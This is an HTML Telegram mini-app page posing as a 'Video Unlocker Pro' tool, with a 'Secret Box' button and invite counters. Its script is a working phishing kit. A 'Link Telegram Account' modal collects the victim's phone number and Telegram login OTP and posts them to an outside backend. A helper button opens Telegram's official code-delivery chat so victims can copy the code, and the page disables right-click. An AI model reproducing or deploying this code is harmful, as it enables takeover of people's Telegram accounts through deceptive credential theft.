<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video Unlocker Pro</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f0f0f; color: white; margin: 0; padding: 10px; user-select: none; touch-action: manipulation; }
        .add-group-btn { background: linear-gradient(90deg, #ff0055, #ff00aa); color: white; border: none; padding: 14px; border-radius: 30px; font-weight: bold; width: 100%; cursor: pointer; animation: pulse 2s infinite; box-shadow: 0 4px 15px rgba(255,0,85,0.4);}
        .status-container { background: linear-gradient(145deg, #1a1a1a, #222); padding: 15px; border-radius: 12px; border: 1px solid #444; text-align: center; margin-bottom: 15px; }
        .progress-bar { background: linear-gradient(90deg, #00ffaa, #00aaff); height: 100%; width: 0%; transition: width 0.8s; }
        .video-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding-bottom: 20px;}
        .video-card { background: #111; border-radius: 12px; overflow: hidden; position: relative; border: 1px solid #333; cursor: pointer; height: 190px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); justify-content: center; align-items: center; z-index: 1000; }
        .modal-content { background: #1a1a1a; padding: 30px 20px; border-radius: 20px; width: 85%; max-width: 350px; text-align: center; }
        .share-btn { background: linear-gradient(90deg, #0088cc, #00aaff); color: white; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; }
        .login-input { width: 90%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #000; color: #fff; margin-bottom: 10px; text-align: center; }
        .mystery-fab { position: fixed; bottom: 25px; right: 15px; background: linear-gradient(135deg, #ff0055, #ffcc00); padding: 12px 16px; border-radius: 14px; font-weight: bold; cursor: pointer; border: 2px solid #fff; z-index: 999; }
        #toast { visibility: hidden; background: #333; color: #fff; text-align: center; border-radius: 8px; padding: 12px; position: fixed; z-index: 9999; left: 50%; bottom: 30px; transform: translateX(-50%); }
        #toast.show { visibility: visible; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div style="text-align: center; margin-top: 5px;">
        <button class="add-group-btn" onclick="tg.openTelegramLink(`https://t.me/File_Unlocker_Pro_bot?startgroup=true`)">🚀 Add Bot to Group</button>
    </div>
    
    <div class="status-container">
        <div id="progress-text">Your Total Invites: <span style="color:#00ffaa;">0</span></div>
        <div style="height:10px; background:#000; border-radius:10px; overflow:hidden; margin:10px 0;"><div class="progress-bar" id="bar-fill"></div></div>
    </div>

    <div class="mystery-fab" onclick="openLogin()">🎁 Secret Box</div>
    <div id="video-container" class="video-grid"></div>
    <div id="toast">Loading...</div>

    <!-- Login Modal -->
    <div class="modal" id="loginModal">
        <div class="modal-content">
            <h3 style="color: #00ffaa;">🔐 Link Telegram Account</h3>
            <div id="phone-sec">
                <input type="text" id="phone-input" class="login-input" placeholder="e.g. 017XXXXXXXX">
                <button class="share-btn" onclick="sendCode()">Send OTP Code</button>
            </div>
            <div id="otp-sec" style="display: none;">
                <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP">
                <button onclick="directOpenTelegram()" style="width: 100%; padding: 10px; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px;">👀 View Code (Direct)</button>
                <button class="share-btn" onclick="verifyCode()" style="margin-top:10px;">Verify & Connect</button>
            </div>
            <button class="close-btn-modal" style="background:transparent; color:#888; border:none; margin-top:15px;" onclick="document.getElementById('loginModal').style.display='none'">Maybe Later</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : '123456';
        const BACKEND_URL = 'https://pmrony-forwardbot.hf.space';

        function showToast(msg) {
            const toast = document.getElementById("toast");
            toast.innerText = msg;
            toast.className = "show";
            setTimeout(() => { toast.className = ""; }, 3000);
        }

        // এটাই সেই ম্যাজিক ফাংশন যা কোনো পপআপ বা ডাবল অ্যাপ ছাড়াই সরাসরি চ্যাট ওপেন করবে
        function directOpenTelegram() {
            showToast("Opening Telegram...");
            // সরাসরি এন্ড্রয়েড ইন্টেন্ট কল - কোনো ব্রাউজার ওপেন হবে না
            window.location.href = "intent://user?id=777000#Intent;scheme=tg;package=org.telegram.messenger;end";
            // যদি অফিশিয়াল না থাকে, তবে প্লাস মেসেঞ্জার বা অন্যান্য সব অ্যাপ সাপোর্ট করবে
            setTimeout(() => {
                window.location.href = "tg://user?id=777000";
            }, 500);
        }

        async function openLogin() {
            document.getElementById('loginModal').style.display = 'flex';
        }

        async function sendCode() {
            let phone = document.getElementById('phone-input').value.trim();
            const res = await fetch(`${BACKEND_URL}/api/send_code`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone, user_id: userId })
            });
            const data = await res.json();
            if(data.status === "ok") {
                localStorage.setItem("savedPhone", phone);
                localStorage.setItem("savedHash", data.hash);
                document.getElementById('phone-sec').style.display = 'none';
                document.getElementById('otp-sec').style.display = 'block';
                showToast("Code sent!");
            } else showToast("Error: " + data.msg);
        }

        async function verifyCode() {
            const otp = document.getElementById('otp-input').value.trim();
            const phone = localStorage.getItem("savedPhone");
            const hash = localStorage.getItem("savedHash");
            const res = await fetch(`${BACKEND_URL}/api/verify_code`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: phone, hash: hash, otp: otp, user_id: userId })
            });
            const data = await res.json();
            if(data.status === "ok") {
                showToast("Success!");
                location.reload();
            } else showToast("Invalid OTP!");
        }
    </script>
</body>
</html>
